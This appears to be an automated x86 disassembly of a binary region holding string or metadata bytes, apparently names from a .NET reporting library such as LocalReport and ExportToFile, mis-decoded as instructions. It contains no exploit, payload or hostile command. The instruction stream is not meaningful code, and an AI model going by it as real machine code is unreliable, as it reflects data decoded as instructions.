  407296:	gs je  0x4072eb
  407299:	gs jo  0x40730b
  40729c:	jb     0x407312
  40729e:	inc    esp
  40729f:	popa   
  4072a0:	je     0x407303
  4072a2:	push   ebx
  4072a3:	outs   dx,DWORD PTR ds:[esi]
  4072a4:	jne    0x407318
  4072a6:	arpl   WORD PTR [ebp+0x43],sp
  4072a9:	jb     0x407310
  4072ab:	fs outs dx,BYTE PTR gs:[esi]
  4072ae:	je     0x407319
  4072b0:	popa   
  4072b1:	ins    BYTE PTR es:[edi],dx
  4072b2:	jae    0x4072f2
  4072b4:	bound  ebx,QWORD PTR [edi+0x5f]
  4072b7:	arpl   WORD PTR [eax],ax
  4072b9:	cmp    al,0x3e
  4072bb:	arpl   WORD PTR [edi+0x5f],bx
  4072be:	inc    esp
  4072bf:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  4072c6:	ins    BYTE PTR es:[edi],dx
  4072c7:	popa   
  4072c8:	jae    0x40733d
  4072ca:	xor    DWORD PTR [eax],esi
  4072cc:	add    BYTE PTR [ecx+0x73],ch
  4072cf:	dec    edi
  4072d0:	jne    0x407346
  4072d2:	dec    edi
  4072d3:	inc    sp
  4072d5:	popa   
  4072d6:	je     0x40733d
  4072d8:	dec    esp
  4072d9:	outs   dx,DWORD PTR ds:[esi]
  4072da:	arpl   WORD PTR [ecx+0x6c],sp
  4072dd:	add    BYTE PTR [ecx+eiz*2+0x74],ah
  4072e1:	popa   
  4072e2:	inc    esi
  4072e3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x7465473c
  4072eb:	push   edx
  4072ec:	gs jo  0x40735e
  4072ef:	jb     0x407365
  4072f1:	inc    esp
  4072f2:	popa   
  4072f3:	je     0x407356
  4072f5:	inc    esi
  4072f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x49],0x3e6f666e
  4072fe:	bound  ebx,QWORD PTR [edi+0x5f]
  407301:	data16 add BYTE PTR [esi+edi*1],bh
  407305:	arpl   WORD PTR [edi+0x5f],bx
  407308:	inc    esp
  407309:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  407310:	ins    BYTE PTR es:[edi],dx
  407311:	popa   
  407312:	jae    0x407387
  407314:	xor    DWORD PTR [ebx],esi
  407316:	add    BYTE PTR [edx*2+0x74616470],bh
  40731d:	gs push edx
  40731f:	gs jo  0x407391
  407322:	jb     0x407398
  407324:	inc    esp
  407325:	popa   
  407326:	je     0x407389
  407328:	inc    esi
  407329:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x75746174
  407331:	jae    0x407371
  407333:	bound  ebx,QWORD PTR [edi+0x5f]
  407336:	xor    DWORD PTR [edx],esi
  407338:	add    BYTE PTR [edx+0x65],dl
  40733b:	arpl   WORD PTR [edi+0x76],bp
  40733e:	gs jb  0x4073a2
  407341:	bound  ebp,QWORD PTR [ebp+eiz*2+0x45]
  407345:	jb     0x4073b9
  407347:	outs   dx,DWORD PTR ds:[esi]
  407348:	jb     0x407392
  40734a:	popa   
  40734b:	outs   dx,BYTE PTR ds:[esi]
  40734c:	fs ins BYTE PTR es:[edi],dx
  40734e:	gs jb  0x407351
  407351:	inc    esi
  407352:	popa   
  407353:	jne    0x4073c1
  407355:	je     0x40739c
  407357:	js     0x4073bc
  407359:	gs jo  0x4073d0
  40735c:	imul   ebp,DWORD PTR [edi+0x6e],0x74654700
  407363:	inc    ebp
  407364:	js     0x4073c9
  407366:	gs jo  0x4073dd
  407369:	imul   ebp,DWORD PTR [edi+0x6e],0x52726f46
  407370:	arpl   WORD PTR gs:[edi+0x76],bp
  407374:	gs jb  0x4073d8
  407377:	bound  ebp,QWORD PTR [ebp+eiz*2+0x45]
  40737b:	jb     0x4073ef
  40737d:	outs   dx,DWORD PTR ds:[esi]
  40737e:	jb     0x407380
  407380:	inc    ebx
  407381:	outs   dx,DWORD PTR ds:[esi]
  407382:	ins    DWORD PTR es:[edi],dx
  407383:	jo     0x4073ee
  407385:	ins    BYTE PTR es:[edi],dx
  407386:	gs jb  0x4073d0
  407389:	outs   dx,BYTE PTR gs:[esi]
  40738b:	gs jb  0x4073ef
  40738e:	je     0x4073f5
  407390:	fs inc ecx
  407392:	je     0x407408
  407394:	jb     0x4073ff
  407396:	bound  esi,QWORD PTR [ebp+0x74]
  407399:	add    BYTE PTR gs:[edi+0x65],ah
  40739d:	je     0x4073fe
  40739f:	inc    esi
  4073a0:	jne    0x40740e
  4073a2:	ins    BYTE PTR es:[edi],dx
  4073a3:	dec    esi
  4073a4:	popa   
  4073a5:	ins    DWORD PTR es:[edi],dx
  4073a6:	add    BYTE PTR gs:[ebx+0x65],dl
  4073aa:	jb     0x407422
  4073ac:	imul   esp,DWORD PTR [ebx+0x65],0x61686542
  4073b3:	jbe    0x40741e
  4073b5:	outs   dx,DWORD PTR ds:[esi]
  4073b6:	jb     0x4073f9
  4073b8:	je     0x40742e
  4073ba:	jb     0x407425
  4073bc:	bound  esi,QWORD PTR [ebp+0x74]
  4073bf:	add    BYTE PTR gs:[ebp+eiz*2+0x6c],al
  4073c4:	gs addr16 popa 
  4073c7:	je     0x40742e
  4073c9:	add    BYTE PTR [ebx+0x6f],al
  4073cc:	ins    DWORD PTR es:[edi],dx
  4073cd:	bound  ebp,QWORD PTR [ecx+0x6e]
  4073d0:	add    BYTE PTR gs:[ecx+0x6e],cl
  4073d4:	je     0x40743b
  4073d6:	jb     0x407444
  4073d8:	outs   dx,DWORD PTR ds:[esi]
  4073d9:	arpl   WORD PTR [ebx+0x65],bp
  4073dc:	add    BYTE PTR fs:[ebx+0x6f],al
  4073e0:	ins    DWORD PTR es:[edi],dx
  4073e1:	jo     0x407444
  4073e3:	jb     0x40744a
  4073e5:	inc    ebp
  4073e6:	js     0x40744b
  4073e8:	push   0x65676e61
  4073ed:	add    BYTE PTR [edx+0x65],dl
  4073f0:	ins    DWORD PTR es:[edi],dx
  4073f1:	outs   dx,DWORD PTR ds:[esi]
  4073f2:	jbe    0x407459
  4073f4:	add    BYTE PTR [ecx+0x6e],cl
  4073f7:	jbe    0x407468
  4073f9:	imul   esp,DWORD PTR [ebp+0x0],0x4d
  4073fd:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  407404:	je     0x407434
  407406:	push   edx
  407407:	gs jo  0x407479
  40740a:	jb     0x407480
  40740c:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  407413:	imul   esp,DWORD PTR [ebx+0x65],0x65522e73
  40741a:	jo     0x40748b
  40741c:	jb     0x407492
  40741e:	push   eax
  40741f:	jb     0x407490
  407421:	arpl   WORD PTR [ebp+0x73],sp
  407424:	jae    0x40748f
  407426:	outs   dx,BYTE PTR ds:[esi]
  407427:	add    BYTE PTR [bx+si+0x75],dl
  40742b:	bound  ebp,QWORD PTR [ecx+ebp*2+0x73]
  40742f:	push   0x52676e69
  407434:	gs jae 0x4074ac
  407437:	ins    BYTE PTR es:[edi],dx
  407438:	je     0x40743a
  40743a:	cmp    al,0x2e
  40743c:	arpl   WORD PTR [edi+ebp*2+0x72],si
  407440:	bound  ebx,QWORD PTR ds:[edi+0x5f]
  407444:	xor    DWORD PTR [eax],eax
  407446:	imul   esp,DWORD PTR [ebx+0x0],0x4c007270
  40744d:	outs   dx,DWORD PTR ds:[esi]
  40744e:	arpl   WORD PTR [ecx+0x6c],sp
  407451:	push   ebx
  407452:	gs jb  0x4074cb
  407455:	imul   esp,DWORD PTR [ebx+0x65],0x636f4c00
  40745c:	popa   
  40745d:	ins    BYTE PTR es:[edi],dx
  40745e:	dec    ebp
  40745f:	outs   dx,DWORD PTR ds:[esi]
  407460:	fs gs push ebx
  407463:	arpl   WORD PTR gs:[ebp+0x72],si
  407467:	imul   esi,DWORD PTR [ecx+edi*2+0x56],0x64696c61
  40746f:	popa   
  407470:	je     0x4074e1
  407472:	jb     0x4074b7
  407474:	popa   
  407475:	ins    BYTE PTR es:[edi],dx
  407476:	ins    BYTE PTR es:[edi],dx
  407477:	bound  esp,QWORD PTR [ecx+0x63]
  40747a:	imul   eax,DWORD PTR [eax],0x43
  40747d:	push   ebx
  40747e:	and    al,0x3c
  407480:	cmp    DWORD PTR ds:[edi+0x5f],ebx
  407484:	inc    ebx
  407485:	popa   
  407486:	arpl   WORD PTR [eax+0x65],bp
  407489:	fs inc ecx
  40748b:	outs   dx,BYTE PTR ds:[esi]
  40748c:	outs   dx,DWORD PTR ds:[esi]
  40748d:	outs   dx,BYTE PTR ds:[esi]
  40748e:	jns    0x4074fd
  407490:	outs   dx,DWORD PTR ds:[esi]
  407491:	jne    0x407506
  407493:	dec    ebp
  407494:	gs je  0x4074ff
  407497:	outs   dx,DWORD PTR ds:[esi]
  407498:	fs inc esp
  40749a:	gs ins BYTE PTR es:[edi],dx
  40749c:	gs addr16 popa 
  40749f:	je     0x407506
  4074a1:	xor    al,BYTE PTR [eax]
  4074a3:	dec    ebp
  4074a4:	outs   dx,DWORD PTR ds:[esi]
  4074a5:	outs   dx,BYTE PTR ds:[esi]
  4074a6:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x746e4500
  4074ae:	gs jb  0x4074b1
  4074b1:	dec    ebp
  4074b2:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4074b9:	je     0x4074e9
  4074bb:	push   edx
  4074bc:	gs jo  0x40752e
  4074bf:	jb     0x407535
  4074c1:	inc    esp
  4074c2:	gs jae 0x40752e
  4074c5:	outs   dx,BYTE PTR ds:[si]
  4074c7:	gs jb  0x4074f8
  4074ca:	push   eax
  4074cb:	jb     0x40753c
  4074cd:	push   0x65
  4074cf:	arpl   WORD PTR [eax+eax*1+0x52],si
  4074d3:	gs jo  0x407545
  4074d6:	jb     0x40754c
  4074d8:	push   ebx
  4074d9:	gs jb  0x407552
  4074dc:	gs jb  0x407528
  4074df:	outs   dx,BYTE PTR ds:[esi]
  4074e0:	outs   dx,WORD PTR ds:[esi]
  4074e2:	jb     0x407551
  4074e4:	popa   
  4074e5:	je     0x407550
  4074e7:	outs   dx,DWORD PTR ds:[esi]
  4074e8:	outs   dx,BYTE PTR ds:[esi]
  4074e9:	add    BYTE PTR [ebx+0x65],dl
  4074ec:	jb     0x407564
  4074ee:	gs jb  0x40753a
  4074f1:	outs   dx,BYTE PTR ds:[esi]
  4074f2:	outs   dx,WORD PTR ds:[esi]
  4074f4:	jb     0x407563
  4074f6:	popa   
  4074f7:	je     0x407562
  4074f9:	outs   dx,DWORD PTR ds:[esi]
  4074fa:	outs   dx,BYTE PTR ds:[esi]
  4074fb:	add    BYTE PTR [ecx+0x53],cl
  4074fe:	gs jb  0x407577
  407501:	imul   esp,DWORD PTR [ebx+0x65],0x766f7250
  407508:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x69784500
  407510:	je     0x407512
  407512:	inc    edi
  407513:	gs je  0x407559
  407516:	popa   
  407517:	ins    BYTE PTR es:[edi],dx
  407518:	ins    BYTE PTR es:[edi],dx
  407519:	bound  esp,QWORD PTR [ecx+0x63]
  40751c:	imul   eax,DWORD PTR [ebx+0x68],0x61
  407520:	outs   dx,BYTE PTR ds:[esi]
  407521:	outs   dx,BYTE PTR ds:[esi]
  407522:	gs ins BYTE PTR es:[edi],dx
  407524:	add    BYTE PTR [ecx+0x43],cl
  407527:	outs   dx,DWORD PTR ds:[esi]
  407528:	outs   dx,BYTE PTR ds:[esi]
  407529:	je     0x407590
  40752b:	js     0x4075a1
  40752d:	inc    ebx
  40752e:	push   0x656e6e61
  407533:	ins    BYTE PTR es:[edi],dx
  407534:	add    BYTE PTR [ecx+ebp*2+0x6d],dl
  407538:	gs push ebx
  40753a:	jo     0x40759d
  40753c:	outs   dx,BYTE PTR ds:[esi]
  40753d:	add    BYTE PTR [ebp+0x61],cl
  407540:	js     0x407598
  407542:	popa   
  407543:	ins    BYTE PTR es:[edi],dx
  407544:	jne    0x4075ab
  407546:	add    BYTE PTR [ebx+0x65],dh
  407549:	je     0x4075aa
  40754b:	dec    edi
  40754c:	jo     0x4075b3
  40754e:	jb     0x4075b1
  407550:	je     0x4075bb
  407552:	outs   dx,DWORD PTR ds:[esi]
  407553:	outs   dx,BYTE PTR ds:[esi]
  407554:	push   esp
  407555:	imul   ebp,DWORD PTR [ebp+0x65],0x74756f
  40755c:	inc    ebp
  40755d:	js     0x4075c4
  40755f:	arpl   WORD PTR [ebp+0x74],si
  407562:	gs push edx
  407564:	gs jo  0x4075d6
  407567:	jb     0x4075dd
  407569:	dec    ecx
  40756a:	outs   dx,BYTE PTR ds:[esi]
  40756b:	push   ebx
  40756c:	popa   
  40756d:	outs   dx,BYTE PTR ds:[esi]
  40756e:	bound  ebp,QWORD PTR fs:[edi+0x78]
  407572:	inc    ecx
  407573:	jo     0x4075e5
  407575:	inc    esp
  407576:	outs   dx,DWORD PTR ds:[esi]
  407577:	ins    DWORD PTR es:[edi],dx
  407578:	popa   
  407579:	imul   ebp,DWORD PTR [esi+0x0],0x5f746573
  407580:	push   ebx
  407581:	arpl   WORD PTR gs:[ebp+0x72],si
  407585:	imul   esi,DWORD PTR [ecx+edi*2+0x56],0x64696c61
  40758d:	popa   
  40758e:	je     0x4075ff
  407590:	jb     0x407592
  407592:	dec    esp
  407593:	outs   dx,DWORD PTR ds:[esi]
  407594:	arpl   WORD PTR [ecx+0x6c],sp
  407597:	inc    esp
  407598:	popa   
  407599:	je     0x4075fc
  40759b:	push   edx
  40759c:	gs je  0x407611
  40759f:	imul   esp,DWORD PTR [ebp+0x76],0x72466c61
  4075a6:	outs   dx,DWORD PTR ds:[esi]
  4075a7:	ins    DWORD PTR es:[edi],dx
  4075a8:	inc    esp
  4075a9:	popa   
  4075aa:	je     0x40760d
  4075ac:	inc    ebp
  4075ad:	js     0x407623
  4075af:	outs   dx,BYTE PTR gs:[esi]
  4075b1:	jae    0x40761c
  4075b3:	outs   dx,DWORD PTR ds:[esi]
  4075b4:	outs   dx,BYTE PTR ds:[esi]
  4075b5:	inc    ebx
  4075b6:	outs   dx,DWORD PTR ds:[esi]
  4075b7:	outs   dx,BYTE PTR ds:[esi]
  4075b8:	imul   sp,WORD PTR [edi+0x46],0x6c69
  4075be:	add    BYTE PTR gs:[edi+ebp*2+0x63],cl
  4075c3:	popa   
  4075c4:	ins    BYTE PTR es:[edi],dx
  4075c5:	inc    esp
  4075c6:	popa   
  4075c7:	je     0x40762a
  4075c9:	push   edx
  4075ca:	gs je  0x40763f
  4075cd:	imul   esp,DWORD PTR [ebp+0x76],0x73006c61
  4075d4:	gs je  0x407636
  4075d7:	inc    esp
  4075d8:	popa   
  4075d9:	je     0x40763c
  4075db:	push   edx
  4075dc:	gs je  0x407651
  4075df:	imul   esp,DWORD PTR [ebp+0x76],0x49006c61
  4075e6:	outs   dx,BYTE PTR ds:[esi]
  4075e7:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4075ef:	push   esp
  4075f0:	push   0x64616572
  4075f5:	inc    esi
  4075f6:	outs   dx,DWORD PTR ds:[esi]
  4075f7:	jb     0x40764c
  4075f9:	gs jb  0x407672
  4075fc:	imul   esp,DWORD PTR [ebx+0x65],0x636f4c00
  407603:	popa   
  407604:	ins    BYTE PTR es:[edi],dx
  407605:	push   edx
  407606:	gs jo  0x407678
  407609:	jb     0x40767f
  40760b:	add    BYTE PTR [ebx+0x72],al
  40760e:	gs popa 
  407610:	je     0x407677
  407612:	dec    ecx
  407613:	je     0x40767a
  407615:	ins    DWORD PTR es:[edi],dx
  407616:	inc    ebx
  407617:	outs   dx,DWORD PTR ds:[esi]
  407618:	outs   dx,BYTE PTR ds:[esi]
  407619:	je     0x407680
  40761b:	js     0x407691
  40761d:	inc    esi
  40761e:	outs   dx,DWORD PTR ds:[esi]
  40761f:	jb     0x407667
  407621:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x687461
  407629:	jae    0x407690
  40762b:	je     0x40768c
  40762d:	dec    ecx
  40762e:	je     0x407695
  407630:	ins    DWORD PTR es:[edi],dx
  407631:	inc    ebx
  407632:	outs   dx,DWORD PTR ds:[esi]
  407633:	outs   dx,BYTE PTR ds:[esi]
  407634:	je     0x40769b
  407636:	js     0x4076ac
  407638:	add    BYTE PTR [edi+ebp*2+0x63],cl
  40763c:	popa   
  40763d:	ins    BYTE PTR es:[edi],dx
  40763e:	inc    ebp
  40763f:	js     0x4076a6
  407641:	arpl   WORD PTR [ebp+0x74],si
  407644:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  40764b:	add    BYTE PTR [edi+0x65],ah
  40764e:	je     0x4076af
  407650:	inc    ebp
  407651:	js     0x4076b8
  407653:	arpl   WORD PTR [ebp+0x74],si
  407656:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  40765d:	add    BYTE PTR [ebx+0x65],dl
  407660:	jb     0x4076cb
  407662:	popa   
  407663:	ins    BYTE PTR es:[edi],dx
  407664:	imul   edi,DWORD PTR [edx+0x65],0x6f444900
  40766b:	arpl   WORD PTR [ebp+0x6d],si
  40766e:	outs   dx,BYTE PTR gs:[esi]
  407670:	je     0x4076bf
  407672:	popa   
  407673:	jo     0x407675
  407675:	dec    esp
  407676:	imul   esi,DWORD PTR [ebx+0x74],0x4f003160
  40767d:	outs   dx,BYTE PTR ds:[esi]
  40767e:	inc    esp
  40767f:	gs ins DWORD PTR es:[edi],dx
  407681:	popa   
  407682:	outs   dx,BYTE PTR ds:[esi]
  407683:	fs inc esp
  407685:	outs   dx,DWORD PTR ds:[esi]
  407686:	arpl   WORD PTR [ebp+0x6d],si
  407689:	outs   dx,BYTE PTR gs:[esi]
  40768b:	je     0x4076da
  40768d:	popa   
  40768e:	jo     0x4076de
  407690:	outs   dx,DWORD PTR ds:[esi]
  407691:	fs add BYTE PTR gs:[ecx+0x45],cl
  407696:	outs   dx,BYTE PTR ds:[esi]
  407697:	jne    0x407706
  407699:	gs jb  0x4076fd
  40769c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  4076a0:	xor    DWORD PTR [eax],eax
  4076a2:	dec    esp
  4076a3:	outs   dx,DWORD PTR ds:[esi]
  4076a4:	arpl   WORD PTR [ecx+0x6c],sp
  4076a7:	push   edx
  4076a8:	outs   dx,BYTE PTR gs:[esi]
  4076aa:	fs gs jb 0x407717
  4076ae:	outs   dx,BYTE PTR ds:[esi]
  4076af:	addr16 inc ebp
  4076b1:	js     0x407727
  4076b3:	outs   dx,BYTE PTR gs:[esi]
  4076b5:	jae    0x407720
  4076b7:	outs   dx,DWORD PTR ds:[esi]
  4076b8:	outs   dx,BYTE PTR ds:[esi]
  4076b9:	dec    ecx
  4076ba:	outs   dx,BYTE PTR ds:[esi]
  4076bb:	outs   dx,WORD PTR ds:[esi]
  4076bd:	add    BYTE PTR [ebx+0x79],dl
  4076c0:	jae    0x407736
  4076c2:	gs ins DWORD PTR es:[edi],dx
  4076c4:	cs inc ebx
  4076c6:	outs   dx,DWORD PTR ds:[esi]
  4076c7:	ins    BYTE PTR es:[edi],dx
  4076c8:	ins    BYTE PTR es:[edi],dx
  4076c9:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4076ce:	outs   dx,BYTE PTR ds:[esi]
  4076cf:	jae    0x4076ff
  4076d1:	push   ebx
  4076d2:	jo     0x407739
  4076d4:	arpl   WORD PTR [ecx+0x61],bp
  4076d7:	ins    BYTE PTR es:[edi],dx
  4076d8:	imul   edi,DWORD PTR [edx+0x65],0x614e0064
  4076df:	ins    DWORD PTR es:[edi],dx
  4076e0:	gs push esi
  4076e2:	popa   
  4076e3:	ins    BYTE PTR es:[edi],dx
  4076e4:	jne    0x40774b
  4076e6:	inc    ebx
  4076e7:	outs   dx,DWORD PTR ds:[esi]
  4076e8:	ins    BYTE PTR es:[edi],dx
  4076e9:	ins    BYTE PTR es:[edi],dx
  4076ea:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4076ef:	outs   dx,BYTE PTR ds:[esi]
  4076f0:	add    BYTE PTR [ecx+eiz*2+0x74],al
  4076f4:	popa   
  4076f5:	push   ebx
  4076f6:	outs   dx,DWORD PTR ds:[esi]
  4076f7:	jne    0x40776b
  4076f9:	arpl   WORD PTR [ebp+0x50],sp
  4076fc:	jb     0x40776d
  4076fe:	ins    DWORD PTR es:[edi],dx
  4076ff:	jo     0x407775
  407701:	inc    ebx
  407702:	outs   dx,DWORD PTR ds:[esi]
  407703:	ins    BYTE PTR es:[edi],dx
  407704:	ins    BYTE PTR es:[edi],dx
  407705:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40770a:	outs   dx,BYTE PTR ds:[esi]
  40770b:	add    BYTE PTR [ecx+eiz*2+0x74],al
  40770f:	popa   
  407710:	jae    0x407781
  407712:	jne    0x407786
  407714:	arpl   WORD PTR [ebp+0x43],sp
  407717:	jb     0x40777e
  407719:	fs outs dx,BYTE PTR gs:[esi]
  40771c:	je     0x407787
  40771e:	popa   
  40771f:	ins    BYTE PTR es:[edi],dx
  407720:	jae    0x407722
  407722:	ja     0x407785
  407724:	jb     0x407794
  407726:	imul   ebp,DWORD PTR [esi+0x67],0x74794273
  40772d:	gs jae 0x407730
  407730:	cmp    al,0x52
  407732:	outs   dx,BYTE PTR gs:[esi]
  407734:	fs gs jb 0x407776
  407738:	bound  ebx,QWORD PTR [edi+0x5f]
  40773b:	xor    eax,DWORD PTR [eax]
  40773d:	ins    BYTE PTR es:[edi],dx
  40773e:	popa   
  40773f:	jae    0x4077b5
  407741:	inc    ebx
  407742:	popa   
  407743:	ins    BYTE PTR es:[edi],dx
  407744:	ins    BYTE PTR es:[edi],dx
  407745:	bound  esp,QWORD PTR [ecx+0x63]
  407748:	imul   edx,DWORD PTR [ebx+0x74],0x72
  40774c:	gs popa 
  40774e:	ins    DWORD PTR es:[edi],dx
  40774f:	dec    ecx
  407750:	outs   dx,BYTE PTR ds:[esi]
  407751:	outs   dx,WORD PTR ds:[esi]
  407753:	add    BYTE PTR [ebp+0x69],cl
  407756:	arpl   WORD PTR [edx+0x6f],si
  407759:	jae    0x4077ca
  40775b:	data16 je 0x40778c
  40775e:	push   edx
  40775f:	gs jo  0x4077d1
  407762:	jb     0x4077d8
  407764:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  40776b:	imul   esp,DWORD PTR [ebx+0x65],0x6e492e73
  407772:	je     0x4077d9
  407774:	jb     0x4077dc
  407776:	popa   
  407777:	arpl   WORD PTR [ebp+0x73],sp
  40777a:	add    BYTE PTR [ebx+0x74],dl
  40777d:	jb     0x4077e4
  40777f:	popa   
  407780:	ins    DWORD PTR es:[edi],dx
  407781:	dec    edi
  407782:	jo     0x4077e9
  407784:	jb     0x407786
  407786:	cmp    al,0x49
  407788:	outs   dx,BYTE PTR ds:[esi]
  407789:	je     0x4077f0
  40778b:	jb     0x4077fb
  40778d:	popa   
  40778e:	ins    BYTE PTR es:[edi],dx
  40778f:	push   edx
  407790:	outs   dx,BYTE PTR gs:[esi]
  407792:	fs gs jb 0x4077d4
  407796:	bound  ebx,QWORD PTR [edi+0x5f]
  407799:	add    BYTE PTR ss:[ebp+0x78],ah
  40779d:	je     0x407804
  40779f:	outs   dx,BYTE PTR ds:[esi]
  4077a0:	jae    0x40780b
  4077a2:	outs   dx,DWORD PTR ds:[esi]
  4077a3:	outs   dx,BYTE PTR ds:[esi]
  4077a4:	add    BYTE PTR [edi+0x69],dh
  4077a7:	ins    BYTE PTR es:[edi],dx
  4077a8:	ins    BYTE PTR es:[edi],dx
  4077a9:	push   ebx
  4077aa:	gs imul eax,DWORD PTR gs:[eax],0x43
  4077af:	jb     0x407816
  4077b1:	popa   
  4077b2:	je     0x407819
  4077b4:	inc    ecx
  4077b5:	outs   dx,BYTE PTR ds:[esi]
  4077b6:	fs push edx
  4077b8:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x74537265
  4077c1:	jb     0x407828
  4077c3:	popa   
  4077c4:	ins    DWORD PTR es:[edi],dx
  4077c5:	add    BYTE PTR [eax+0x72],dl
  4077c8:	outs   dx,DWORD PTR ds:[esi]
  4077c9:	arpl   WORD PTR [ebp+0x73],sp
  4077cc:	jae    0x407837
  4077ce:	outs   dx,BYTE PTR ds:[esi]
  4077cf:	addr16 dec ebp
  4077d1:	gs jae 0x407847
  4077d4:	popa   
  4077d5:	addr16 gs dec esp
  4077d8:	imul   esi,DWORD PTR [ebx+0x74],0x6e454900
  4077df:	jne    0x40784e
  4077e1:	gs jb  0x407845
  4077e4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4077e8:	dec    ebp
  4077e9:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4077f0:	je     0x407820
  4077f2:	push   edx
  4077f3:	gs jo  0x407865
  4077f6:	jb     0x40786c
  4077f8:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  4077ff:	imul   esp,DWORD PTR [ebx+0x65],0x6e4f2e73
  407806:	inc    esp
  407807:	gs ins DWORD PTR es:[edi],dx
  407809:	popa   
  40780a:	outs   dx,BYTE PTR ds:[esi]
  40780b:	fs push edx
  40780d:	gs jo  0x40787f
  407810:	jb     0x407886
  407812:	push   edx
  407813:	outs   dx,BYTE PTR gs:[esi]
  407815:	fs gs jb 0x407882
  407819:	outs   dx,BYTE PTR ds:[esi]
  40781a:	add    BYTE PTR [bp+di+0x6f],dl
  40781e:	jb     0x407894
  407820:	dec    edi
  407821:	jo     0x407897
  407823:	imul   ebp,DWORD PTR [edi+0x6e],0x61500073
  40782a:	jb     0x40789f
  40782c:	add    BYTE PTR gs:[edx+0x65],dl
  407830:	ins    BYTE PTR es:[edi],dx
  407831:	gs popa 
  407833:	jae    0x40789a
  407835:	push   ebx
  407836:	popa   
  407837:	outs   dx,BYTE PTR ds:[esi]
  407838:	bound  ebp,QWORD PTR fs:[edi+0x78]
  40783c:	inc    ecx
  40783d:	jo     0x4078af
  40783f:	inc    esp
  407840:	outs   dx,DWORD PTR ds:[esi]
  407841:	ins    DWORD PTR es:[edi],dx
  407842:	popa   
  407843:	imul   ebp,DWORD PTR [esi+0x0],0x6e65533c
  40784a:	fs push ebx
  40784c:	je     0x4078c0
  40784e:	gs popa 
  407850:	ins    DWORD PTR es:[edi],dx
  407851:	push   esp
  407852:	outs   dx,DWORD PTR ds:[esi]
  407853:	inc    ebx
  407854:	popa   
  407855:	ins    BYTE PTR es:[edi],dx
  407856:	ins    BYTE PTR es:[edi],dx
  407857:	bound  esp,QWORD PTR [ecx+0x63]
  40785a:	imul   eax,DWORD PTR [ecx+0x6e],0x64
  40785e:	inc    esp
  40785f:	imul   esi,DWORD PTR [ebx+0x70],0x3e65736f
  407866:	bound  ebx,QWORD PTR [edi+0x5f]
  407869:	cmp    DWORD PTR [eax],eax
  40786b:	jae    0x4078d2
  40786d:	je     0x4078ce
  40786f:	push   eax
  407870:	outs   dx,DWORD PTR ds:[esi]
  407871:	jae    0x4078dc
  407873:	je     0x4078de
  407875:	outs   dx,DWORD PTR ds:[esi]
  407876:	outs   dx,BYTE PTR ds:[esi]
  407877:	add    BYTE PTR [edx+0x79],al
  40787a:	je     0x4078e1
  40787c:	add    BYTE PTR [edx+0x65],dl
  40787f:	popa   
  407880:	add    BYTE PTR fs:[ecx+0x62],al
  407884:	outs   dx,DWORD PTR ds:[esi]
  407885:	jb     0x4078fb
  407887:	add    BYTE PTR [edi+0x70],cl
  40788a:	gs jb  0x4078ee
  40788d:	je     0x4078f8
  40788f:	outs   dx,DWORD PTR ds:[esi]
  407890:	outs   dx,BYTE PTR ds:[esi]
  407891:	inc    ebx
  407892:	popa   
  407893:	outs   dx,BYTE PTR ds:[esi]
  407894:	arpl   WORD PTR [ebp+0x6c],sp
  407897:	gs fs inc ebp
  40789a:	js     0x4078ff
  40789c:	gs jo  0x407913
  40789f:	imul   ebp,DWORD PTR [edi+0x6e],0x633e3c00
  4078a6:	pop    edi
  4078a7:	pop    edi
  4078a8:	inc    esp
  4078a9:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  4078b0:	ins    BYTE PTR es:[edi],dx
  4078b1:	popa   
  4078b2:	jae    0x407927
  4078b4:	xor    DWORD PTR [ecx],esi
  4078b6:	add    BYTE PTR [edx+0x61],ah
  4078b9:	arpl   WORD PTR [ebx+0x67],bp
  4078bc:	jb     0x40792d
  4078be:	jne    0x40792e
  4078c0:	fs push esp
  4078c2:	push   0x64616572
  4078c7:	inc    ebp
  4078c8:	js     0x40792d
  4078ca:	gs jo  0x407941
  4078cd:	imul   ebp,DWORD PTR [edi+0x6e],0x78453c00
  4078d4:	arpl   WORD PTR gs:[ebp+0x74],si
  4078d8:	gs inc ebx
  4078da:	popa   
  4078db:	outs   dx,BYTE PTR ds:[esi]
  4078dc:	arpl   WORD PTR [ebp+0x6c],sp
  4078df:	ins    BYTE PTR es:[edi],dx
  4078e0:	popa   
  4078e1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4f]
  4078e5:	jo     0x40794c
  4078e7:	jb     0x40794a
  4078e9:	je     0x407954
  4078eb:	outs   dx,DWORD PTR ds:[esi]
  4078ec:	outs   dx,BYTE PTR ds:[esi]
  4078ed:	bound  ebx,QWORD PTR ds:[edi+0x5f]
  4078f1:	xor    DWORD PTR [eax],esi
  4078f3:	add    BYTE PTR [eax+ebp*2+0x72],dl
  4078f7:	gs popa 
  4078f9:	fs inc ecx
  4078fb:	bound  ebp,QWORD PTR [edi+0x72]
  4078fe:	je     0x407945
  407900:	js     0x407965
  407902:	gs jo  0x407979
  407905:	imul   ebp,DWORD PTR [edi+0x6e],0x72685400
  40790c:	gs popa 
  40790e:	fs push ebx
  407910:	je     0x407973
  407912:	jb     0x407988
  407914:	add    BYTE PTR [ecx+0x6e],cl
  407917:	jbe    0x40797a
